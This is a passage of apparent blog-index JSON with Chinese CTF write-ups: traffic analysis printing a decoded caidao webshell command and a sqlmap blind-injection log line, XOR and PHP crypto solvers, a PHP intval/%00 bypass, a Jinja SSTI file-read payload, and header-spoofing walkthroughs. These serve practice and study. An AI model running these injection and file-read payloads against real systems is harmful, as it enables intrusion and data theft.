$_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;],\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          \u0026#39;user_agent\u0026#39; =\u0026gt; $_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;],\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          \u0026#39;user_data\u0026#39; =\u0026gt; \u0026#39;\u0026#39;,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      );\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      $cookiedata = serialize($\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e  );\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      $cookiedata = $cookiedata.md5($this-\u0026gt;eancrykey.$cookiedata);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      $expire = $this-\u0026gt;cookie_expiration + time();\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      setcookie(\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          $this-\u0026gt;cookie_name,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          $cookiedata,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          $expire,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          $this-\u0026gt;cookie_path,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          $this-\u0026gt;cookie_domain,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          $this-\u0026gt;cookie_secure\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          );\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e$ddctf = new Session();\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e$ddctf-\u0026gt;index();\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e?\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e得到\u003ccode\u003ekey\u003c/code\u003e之后构造ddctfid:\u003c/p\u003e","title":"2019 DDCTF web"},{"content":" bugku 中的部分misc题目\n中国菜刀 下载流量包之后追踪tcp流量或者http流量可以在目录中看见flag.tar.gz字段\n思路1：binwalk\n先把数据包文件拖进kali子系统中\nchmod 777 caidao/ cd caidao/ chmod 777 caidao.pcapng binwalk -e caidao.pcapng cd _caidao.pcapng.extracted/ cat 1E43 思路2：wireshark数据包追踪，把一串base64拎出来\n@ini_set(\u0026#34;display_errors\u0026#34;,\u0026#34;0\u0026#34;); @set_time_limit(0); if(PHP_VERSION\u0026lt;\u0026#39;5.3.0\u0026#39;) {@set_magic_quotes_runtime(0);}; echo(\u0026#34;X@Y\u0026#34;); $D=\u0026#39;C:\\\\wwwroot\\\\\u0026#39;; $F=@opendir($D); if($F==NULL){echo(\u0026#34;ERROR:// Path Not Found Or No Permission!\u0026#34;);} else{$M=NULL;$L=NULL; while($N=@readdir($F)){$P=$D.\u0026#39;/\u0026#39;.$N;$T=@date(\u0026#34;Y-m-d H:i:s\u0026#34;,@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R=\u0026#34;\\t\u0026#34;.$T.\u0026#34;\\t\u0026#34;.@filesize($P).\u0026#34;\\t\u0026#34;.$E.\u0026#34;\\n\u0026#34;;if(@is_dir($P))$M.=$N.\u0026#34;/\u0026#34;.$R;else $L.=$N.$R;} echo $M.$L;@closedir($F);};echo(\u0026#34;X@Y\u0026#34;);die(); 当然这没啥用。。\n数据包的数据都是在line-based text data里面的\n点击line-based text data,右击，点击显示show packet bytes 额。。。把像\\301\\213\\341这样的编码处理一下，之所以start设置为3，是因为前面的开头是x@y，不是base64的东西。。。设置为处理模式为压缩\n这么多数据包 分析，据说如果是挂木马的话tcp流中会有“command”字段,于是设定过滤规则为：\ntcp contains \u0026#34;command\u0026#34; 找出一些tcp包来，然后follow，注意如果是乱码的话可以尝试点一点stream长度，说不定就好了 然后就找到了flag的base64码\n手机热点 蓝牙协议的名字叫做obex，所以在wireshark中搜索一下挑出几个包，然后有一个包写着“secret.rar” 导出来，解压得到flag\n抓到一只苍蝇 http过滤一下，在第一个数据包中的内容如下：\n{ \u0026#34;path\u0026#34;:\u0026#34;fly.rar\u0026#34;, \u0026#34;appid\u0026#34;:\u0026#34;\u0026#34;, \u0026#34;size\u0026#34;:525701, \u0026#34;md5\u0026#34;:\u0026#34;e023afa4f6579db5becda8fe7861c2d3\u0026#34;, \u0026#34;sha\u0026#34;:\u0026#34;ecccba7aea1d482684374b22e2e7abad2ba86749\u0026#34;, \u0026#34;sha3\u0026#34;:\u0026#34;\u0026#34; } 发现了要传输的文件名字、文件的md5码、文件大小，\nhttp \u0026amp;\u0026amp; http.request.method==POST 过滤出来的接下来的5个分片数据包 总长度加起来超过了原文件的数据包大小，原因是附加的文件头。 将这些数据包一个一个导出 然后使用命令：\ndd if=1 bs=1 skip=364 of=1.1 #dd命令用于读取、转换、输出数据 cat *.1 \u0026gt; fly.rar #将这些文件碎片都拼成原始的压缩文件 md5sum fly.rar | grep e023afa4f6579db5becda8fe7861c2d3 #检查MD5码是否匹配 然后用bless打开rar文件，检查加密位，发现是伪加密，因为第一行的73后面的标记位是0000，如果加密就是8000 rar文件头格式介绍：https://wenku.baidu.com/view/b7889b64783e0912a2162aa4.html\n把第二行74后面的84改成80就可以了，因为看论文可以知道，这两个字节的值类似于linux中chmod的1、2、4代表三种权限， 最终将所需权限的值相加在一起得到最终的标志位内容\n改完之后，解压，打开，发现乱码，改后缀为exe，执行，发现一大堆苍蝇\nbinwalk flag.txt #发现很多png图片，尝试使用foremost工具进行文件修复 foremost -v -i flag.txt -o outputfile #-v 将所有信息输出到屏幕上，-i表示输入文件,-o表示输出目标 打开后有二维码，里头有flag\n日志审计 sqlmap二分搜索\n观察下面这个\n172.17.0.1 - - [03/Nov/2018:02:50:57 +0000] \u0026#34;GET /vulnerabilities/sqli_blind/?id=2\u0026#39; AND ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM dvwa.flag_is_here ORDER BY flag LIMIT 0,1),24,1))\u0026gt;124 AND \u0026#39;RCKM\u0026#39;=\u0026#39;RCKM\u0026amp;Submit=Submit HTTP/1.1\u0026#34; 200 1765 \u0026#34;http://127.0.0.1:8001/vulnerabilities/sqli_blind/?id=1\u0026amp;Submit=Submit\u0026#34; \u0026#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36\u0026#34; 特征有200响应成功，而且对于每一位来说，最后一次得到200响应匹配的ascii码加上一就是真实的ascii码，\n1 import urllib 2 import re 3 4 ffile=open(\u0026#39;/home/access.log\u0026#39;,\u0026#39;r\u0026#39;) 5 datas=ffile.readlines() 6 avalid=[] 7 for data in datas: 8 tmp=urllib.unquote(data) 9 if \u0026#39;flag\u0026#39; in tmp and \u0026#39;COUNT\u0026#39; not in tmp and \u0026#39;200\u0026#39; in tmp: 10 avalid.append(tmp) 11 12 flag_ascii={} 13 for segment in avalid: 14 checkout=re.search(r\u0026#39;LIMIT 0,1\\),(.*?),1\\)\\)\u0026gt;(.*?) AND\u0026#39;,segment) #这里(.*?)后面要加AND否则大于号之后的所有内容都被包括进(.*?)中去了 15 if checkout: 16 key=int(checkout.group(1)) 17 print key 18 print checkout.group(2) 19 print int(checkout.group(2)) 20 value=int(checkout.group(2))+1 21 flag_ascii[key]=value #同一个key，value在变化直到最后一个 23 flag=\u0026#39;\u0026#39; for value in flag_ascii.values(): flag+=chr(value) print flag weblogic 说是要找到被攻击主机的名字。过滤条件\ntcp contains \u0026#34;hostname\u0026#34; 然后找一找就行了。。。\n信息提取 这道题真的很懵圈。 将wireshark中涉及到盲注的数据包都导出到txt文件中来。 然后python脚本：\nimport urllib import re f=open(\u0026#39;/root/kkk.txt\u0026#39;,\u0026#39;r\u0026#39;) lines=f.readlines() datas=[] for line in lines: tmp=urllib.unquote(line) datas.append(tmp) flag_ascii={} for data in datas: checkout=re.search(r\u0026#39;LIMIT 0,1),(.*?),1\\)\\)\u0026gt;(.*?) HTTP\u0026#39;,data) if checkout: key=int(checkout.group(1)) value=int(checkout.group(2)) flag_ascii[key]=value flag=\u0026#39;\u0026#39; for value in flag_ascii.values(): flag+=chr(value) print flag 但是不知道为什么flag中有的字符是对的有的是错的。\n","permalink":"https://ch3n9w.github.io/posts/sec-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","summary":"\u003cblockquote\u003e\n\u003cp\u003ebugku 中的部分misc题目\u003c/p\u003e\n\u003c/blockquote\u003e","title":"流量分析"},{"content":" 记录密码学刷过的题目\nDe1ctf2019 xorzz 源码\nfrom itertools import * # from data import flag,plain plain = \u0026#34;dd\u0026#34; flag = \u0026#34;de1ctf{testflag}\u0026#34; key=flag.strip(\u0026#34;de1ctf{\u0026#34;).strip(\u0026#34;}\u0026#34;) assert(len(key)\u0026lt;38) salt=\u0026#34;WeAreDe1taTeam\u0026#34; ki=cycle(key) si=cycle(salt) cipher = \u0026#39;\u0026#39;.join([hex(ord(p) ^ ord(next(ki)) ^ ord(next(si))) for p in plain]) print cipher # output: # 49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c 首先将密文中的盐分去掉。\nfrom itertools import * from base64 import * output=\u0026#39;49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c\u0026#39; salt=\u0026#34;WeAreDe1taTeam\u0026#34; sa = cycle(salt) out = output.decode(\u0026#39;hex\u0026#39;) res = \u0026#34;\u0026#34; for i in out: res += chr(ord(i) ^ ord(next(sa))) # print b64encode(res.encode(\u0026#39;hex\u0026#39;)) print b64encode(res) 去掉盐分之后，问题就变成了汉明文密码。原理见博客https://www.anquanke.com/post/id/161171#h2-0 这里直接上脚本了。\n# -*- coding: utf-8 -*- import itertools import linecache CHARACTER_FREQ = { \u0026#39;a\u0026#39;: 0.0651738, \u0026#39;b\u0026#39;: 0.0124248, \u0026#39;c\u0026#39;: 0.0217339, \u0026#39;d\u0026#39;: 0.0349835, \u0026#39;e\u0026#39;: 0.1041442, \u0026#39;f\u0026#39;: 0.0197881, \u0026#39;g\u0026#39;: 0.0158610, \u0026#39;h\u0026#39;: 0.0492888, \u0026#39;i\u0026#39;: 0.0558094, \u0026#39;j\u0026#39;: 0.0009033, \u0026#39;k\u0026#39;: 0.0050529, \u0026#39;l\u0026#39;: 0.0331490, \u0026#39;m\u0026#39;: 0.0202124, \u0026#39;n\u0026#39;: 0.0564513, \u0026#39;o\u0026#39;: 0.0596302, \u0026#39;p\u0026#39;: 0.0137645, \u0026#39;q\u0026#39;: 0.0008606, \u0026#39;r\u0026#39;: 0.0497563, \u0026#39;s\u0026#39;: 0.0515760, \u0026#39;t\u0026#39;: 0.0729357, \u0026#39;u\u0026#39;: 0.0225134, \u0026#39;v\u0026#39;: 0.0082903, \u0026#39;w\u0026#39;: 0.0171272, \u0026#39;x\u0026#39;: 0.0013692, \u0026#39;y\u0026#39;: 0.0145984, \u0026#39;z\u0026#39;: 0.0007836, \u0026#39; \u0026#39;: 0.1918182 } def xor_repeat_key(key,string): key_len=len(key) result=\u0026#39;\u0026#39; str_result=\u0026#39;\u0026#39; for index,ch in enumerate(string): n=index%key_len b=chr(ord(key[n])^ord(ch)) str_result+=b return str_result #获得概率分数 def get_score(string): score=0 for char in string: char=char.lower() if char in CHARACTER_FREQ: score+=CHARACTER_FREQ[char] return score #将hex的每个字符与备选密钥进行xor def single_xor(candidate_key,hex_string): result=\u0026#34;\u0026#34; for i in hex_string: b=chr(candidate_key^ord(i)) result+=b return result #遍历备选密钥 def Traversal_singlechar(hex_string): candidate=[] for candidate_key in range(256): plaintext=single_xor(candidate_key,hex_string) score=get_score(plaintext) result={ \u0026#39;score\u0026#39;:score, \u0026#39;plaintext\u0026#39;:plaintext, \u0026#39;key\u0026#39;:candidate_key } candidate.append(result) return sorted(candidate,key=lambda c:c[\u0026#39;score\u0026#39;])[-1] def hamming_distance(a_str,b_str): dist=0 for x,y in zip(a_str,b_str): b=bin(ord(x)^ord(y)) #转换为二进制（以字符串形式表示，如“0b100000”，0b表示二进制） dist+=b.count(\u0026#39;1\u0026#39;) return dist def guess_keysize(string): normals=[] for keysize in range(2,40): blocks=[] cnt=0 distance=0 #根据建议获得四个block，将这四个block两两得到hamming_distance。 for i in range(0,len(string),keysize): cnt+=1 blocks.append(string[i:i+keysize]) if cnt==4: break pairs=itertools.combinations(blocks,2) for (x,y) in pairs: distance+=hamming_distance(x,y) #平均一下 distance=distance/(6.0) #Normalize this result by dividing by KEYSIZE. normal_distance=distance/keysize key={ \u0026#39;keysize\u0026#39;:keysize, \u0026#39;distance\u0026#39;:normal_distance } normals.append(key) #print key #选3个最小的为待选的keysize candidate_keysize=sorted(normals,key=lambda c:c[\u0026#39;distance\u0026#39;])[0:3] return candidate_keysize def guess_key(keysize,string): now_str=\u0026#39;\u0026#39; key=\u0026#39;\u0026#39; for i in range(keysize): now_str=\u0026#39;\u0026#39; for index,ch in enumerate(string): if index%keysize==i: now_str+=ch #获得key的第i位的值,转换为字符 #print now_str key+=chr(Traversal_singlechar(now_str)[\u0026#39;key\u0026#39;]) return key def get_plaint(string): keysize_list=guess_keysize(string) candidate_key=[] possible_plaints=[] for keysize in keysize_list: key=guess_key(keysize[\u0026#39;keysize\u0026#39;],string) #print key possible_plaints.append((xor_repeat_key(key,string),key)) \u0026#39;\u0026#39;\u0026#39; for i in possible_plaints: print i[1] print get_score(i[0].decode(\u0026#39;hex\u0026#39;)) print len(i[0]) print i[0].decode(\u0026#39;hex\u0026#39;) \u0026#39;\u0026#39;\u0026#39; return sorted(possible_plaints,key=lambda c:get_score(c[0]))[-1] def main(): assert hamming_distance(\u0026#39;this is a test\u0026#39;, \u0026#39;wokka wokka!!!\u0026#39;) == 37 contents=open(\u0026#39;6.txt\u0026#39;).read() #base64解码 string=str(contents).decode(\u0026#39;base64\u0026#39;) result=get_plaint(string) print result[0] print result[1] if __name__ == \u0026#39;__main__\u0026#39;: main() 6.txt中的内容是去盐分之后的密文base64之后的内容。\n再附上hctf2018中天枢的脚本\nimport string def bxor(a, b): # xor two byte strings of different lengths if len(a) \u0026gt; len(b): return bytes([x ^ y for x, y in zip(a[:len(b)], b)]) else: return bytes([x ^ y for x, y in zip(a, b[:len(a)])]) def hamming_distance(b1, b2): differing_bits = 0 for byte in bxor(b1, b2): differing_bits += bin(byte).count(\u0026#34;1\u0026#34;) return differing_bits def break_single_key_xor(text): key = 0 possible_space=0 max_possible=0 letters = string.ascii_letters.encode(\u0026#39;ascii\u0026#39;) for a in range(0, len(text)): maxpossible = 0 for b in range(0, len(text)): if(a == b): continue c = text[a] ^ text[b] if c not in letters and c != 0: continue maxpossible += 1 if maxpossible\u0026gt;max_possible: max_possible=maxpossible possible_space=a key = text[possible_space]^ 0x20 return chr(key) text = \u0026#39;\u0026#39; with open(\u0026#34;6.txt\u0026#34;,\u0026#34;r\u0026#34;) as f: for line in f: text += line # b = base64.b64decode(text) b = text normalized_distances = [] for KEYSIZE in range(2, 40): b1 = b[: KEYSIZE] b2 = b[KEYSIZE: KEYSIZE * 2] b3 = b[KEYSIZE * 2: KEYSIZE * 3] b4 = b[KEYSIZE * 3: KEYSIZE * 4] b5 = b[KEYSIZE * 4: KEYSIZE * 5] b6 = b[KEYSIZE * 5: KEYSIZE * 6] normalized_distance = float( hamming_distance(b1, b2) + hamming_distance(b2, b3) + hamming_distance(b3, b4) + hamming_distance(b4, b5) + hamming_distance(b5, b6) ) / (KEYSIZE * 5) normalized_distances.append( (KEYSIZE, normalized_distance) ) normalized_distances = sorted(normalized_distances,key=lambda x:x[1]) for KEYSIZE,_ in normalized_distances[:5]: block_bytes = [[] for _ in range(KEYSIZE)] for i, byte in enumerate(b): block_bytes[i % KEYSIZE].append(byte) keys = \u0026#39;\u0026#39; try: for bbytes in block_bytes: keys += break_single_key_xor(bbytes) key = bytearray(keys * len(b), \u0026#34;utf-8\u0026#34;) plaintext = bxor(b, key) print(\u0026#34;keysize:\u0026#34;, KEYSIZE) print(\u0026#34;key is:\u0026#34;, keys, \u0026#34;n\u0026#34;) s = bytes.decode(plaintext) print(s) except Exception: continue MD5 PHP_encrypto_1 source code:::\n\u0026lt;?php function encrypt($data,$key) { $key = md5(\u0026#39;ISCC\u0026#39;); $x = 0; $len = strlen($data); $klen = strlen($key); for ($i=0; $i \u0026lt; $len; $i++) { if ($x == $klen) { $x = 0; } $char .= $key[$x]; $x+=1; } for ($i=0; $i \u0026lt; $len; $i++) { $str .= chr((ord($data[$i]) + ord($char[$i])) % 128); } return base64_encode($str); } ?\u0026gt;//the result is fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA= solving:\n\u0026lt;?php #\u0026#39;ISCC\u0026#39;md5之后的结果 $mkey =\u0026#39;729623334f0aa2784a1599fd374c120d\u0026#39;; $target=\u0026#39;fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=\u0026#39;; $target=base64_decode($target); $target_ay=array(); for ($i=0;$i\u0026lt;strlen($target);$i++) { echo ord($target[$i]).\u0026#39; \u0026#39;; array_push($target_ay,ord($target[$i])); } echo \u0026#34;||||||||\u0026#34;; $j=0; $realkey_ay=array(); for ($i=0;$i\u0026lt;strlen($target);$i++){ if ($j==strlen($mkey)){ $j=0; } echo ord($mkey[$j]).\u0026#39; \u0026#39;; array_push($realkey_ay,ord($mkey[$j])); $j++; } $flag1=\u0026#39;\u0026#39;; $flag2=\u0026#39;\u0026#39;; foreach($target_ay as $key=\u0026gt;$value){ $i=$key; $dd=$value; $od=$realkey_ay[$i]; $flag1.=chr($dd+128-$od); $flag2.=chr($dd-$od); } echo $flag1; echo $flag2; ?\u0026gt; other shiyanbar do you really know php?(plalindrome) \u0026lt;?php $info = \u0026#34;\u0026#34;; $req = []; $flag=\u0026#34;xxxxxxxxxx\u0026#34;; ini_set(\u0026#34;display_error\u0026#34;, false); error_reporting(0); if(!isset($_POST[\u0026#39;number\u0026#39;])){ header(\u0026#34;hint:6c525af4059b4fe7d8c33a.txt\u0026#34;); die(\u0026#34;have a fun!!\u0026#34;); } foreach([$_POST] as $global_var) { foreach($global_var as $key =\u0026gt; $value) { $value = trim($value); is_string($value) \u0026amp;\u0026amp; $req[$key] = addslashes($value); } } function is_palindrome_number($number) { $number = strval($number); $i = 0; $j = strlen($number) - 1; while($i \u0026lt; $j) { if($number[$i] !== $number[$j]) { return false; } $i++; $j--; } return true; } //can not input number if(is_numeric($_REQUEST[\u0026#39;number\u0026#39;])){ $info=\u0026#34;sorry, you cann\u0026#39;t input a number!\u0026#34;; //the number must be int-type }elseif($req[\u0026#39;number\u0026#39;]!=strval(intval($req[\u0026#39;number\u0026#39;]))){ $info = \u0026#34;number must be equal to it\u0026#39;s integer!! \u0026#34;; }else{ $value1 = intval($req[\u0026#34;number\u0026#34;]); $value2 = intval(strrev($req[\u0026#34;number\u0026#34;])); //the number should be plalindrome if($value1!=$value2){ $info=\u0026#34;no, this is not a palindrome number!\u0026#34;; }else{ //the number should not be plalindrome if(is_palindrome_number($req[\u0026#34;number\u0026#34;])){ $info = \u0026#34;nice! {$value1} is a palindrome number!\u0026#34;; }else{ $info=$flag; } } } echo $info; ?\u0026gt; payload :2147483647%00\nfirst: as there is %00, is_numeric() will not recognize it as number\nsecond: both strval and intval will ignore %00 and %20\nthird: after strrev() 2147483647 will turn to 7463847412 , however, intval() can hanle max num of 2147483647, so intval(7463847412)=2147483647\nforth: the number is not plalindrome,so get the flag\nRC4 rc4: 加密和解密都是同一个流程\nimport urllib import requests url = \u0026#34;http://43141291-ab15-4d3a-a236-3c2c0fd69898.node3.buuoj.cn/secret?secret=\u0026#34; class RC4: def __init__(self, key): self.key = key self.key_length = len(key) self._init_S_box() def _init_S_box(self): self.Box = [i for i in range(256)] k = [self.key[i % self.key_length] for i in range(256)] j = 0 for i in range(256): j = (j + self.Box[i] + ord(k[i])) % 256 self.Box[i], self.Box[j] = self.Box[j], self.Box[i] def crypt(self, plaintext): i = 0 j = 0 result = \u0026#39;\u0026#39; for ch in plaintext: i = (i + 1) % 256 j = (j + self.Box[i]) % 256 self.Box[i], self.Box[j] = self.Box[j], self.Box[i] t = (self.Box[i] + self.Box[j]) % 256 result += chr(self.Box[t] ^ ord(ch)) return result a = RC4(\u0026#39;HereIsTreasure\u0026#39;) cmd = \u0026#34;{{ [].__class__.__base__.__subclasses__()[40](\u0026#39;/flag.txt\u0026#39;).read() }}\u0026#34; payload = urllib.parse.quote(a.crypt(cmd)) res = requests.get(url + payload) print(res.text) ","permalink":"https://ch3n9w.github.io/posts/ctf-crypto/","summary":"\u003cblockquote\u003e\n\u003cp\u003e记录密码学刷过的题目\u003c/p\u003e\n\u003c/blockquote\u003e","title":"密码学题目"},{"content":" 纪念那段岁月\nweb3 网站里面循环弹出提示框，用chrome的开发者工具打开一片空白， 用ctrl+u查看源代码，发现一串\n\u0026lt;!--\u0026amp;#75;\u0026amp;#69;\u0026amp;#89;\u0026amp;#123;\u0026amp;#74;\u0026amp;#50;\u0026amp;#115; \u0026amp;#97;\u0026amp;#52;\u0026amp;#50;\u0026amp;#97;\u0026amp;#104;\u0026amp;#74;\u0026amp;#75;\u0026amp;#45; \u0026amp;#72;\u0026amp;#83;\u0026amp;#49;\u0026amp;#49;\u0026amp;#73;\u0026amp;#73;\u0026amp;#73;\u0026amp;#125;--\u0026gt; 这是unicode，转码即可\n你必须让他停下来！ 查看源代码竟然直接有flag了，网上的解法是抓包\n本地包含 解法:利用hellow构造payload $_REQUEST：默认情况下包含了 $_GET，$_POST 和 $_COOKIE 的数组。 var_dump():此函数显示有关包含其类型和值的一个或多个表达式的结构化信息。 递归地探索数组和对象，其中值缩进以显示结构。在这题里面只是显示变量的类型，对 eval并无影响，对于eval来说，和eval（$a）是一样的。\npayload：/index.php?hello = show_source(\u0026lsquo;flag.php\u0026rsquo;) 网上的payload：/index.php?hello=1);show_source(\u0026lsquo;flag.php\u0026rsquo;);var_dump(\n域名解析 编辑etc/hosts添加一条123.206.87.240\tflag.bugku.com， 在浏览器中打开flag.bugku.com即可得到flag。\n反思：host请求头是http1.1添加的东西， 添加域名解析之后直接访问123.206.87.240却显示403，也就是说在https下主机名必不可少。\n添加host之前访问ip地址结果显示错误400（缺少host） 添加host之后访问ip地址结果显示错误403（读取访问被禁）\n你必须让他停下 使用burpsuite的repeater功能进行抓包操作， 通过多次点击go，最终发现在原先是“flag is here”的位置出现了flag\n变量1 函数知识： isset（）判断是否有输入 pre_match是正则表达式，引号中的内容都以/^开头，以$/结尾，\\w+的意思是09 az A~Z， 输入的内容被限定了，所以不能输入代码\n输入arg=GLOBALS，从代码中可知会给GLOBALS再套上一个$，就输出了flag\nWeb5 查看源代码，发现jother编码，打开控制台输入就行了\n头等舱 打开网页显示什么都没有，查看源代码也什么都没有，打开控制台重新加载看头文件，什么也没有， 点击显示头文件源代码，显示flag（注释形式）\n网站被黑 扫描端口\n发现登陆界面\n然后用burpsuite的intruder功能破解\n管理员系统 实在没有头绪，上网查说这是X-Forwarded-For:简称XFF头，它代表客户端， 也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。 也就是第一次发送的时候会记录本主机的ip，之后每次经过一个代理， 都会在尾部添加一个代理的ip， X-Forwarded-For可以显示完整的传输路径和恶意攻击来源但是X-Forward-For可以被伪造。题目中说联系本地管理员，那就设置X-Forwarded-For为代表本地访问的127.0.0.1。 同时查看网页源代码发现，有一串注释，查到说是base64编码， 特征是结尾以一个或者两个=结束，解码后得到密码，输入后使用burpsuite进行拦截， 添加X-Forwarded-For：127。0.0.1后发送，得到了flag\n参考资料：ctf中常见的编码格式： https://www.cnblogs.com/gwind/p/7997922.html\nweb4 查看源代码，发现一串url编码的东西， Eval函数会将里面的内容作为代码执行，unescape将其解码。要解码：\nimport urllib a = 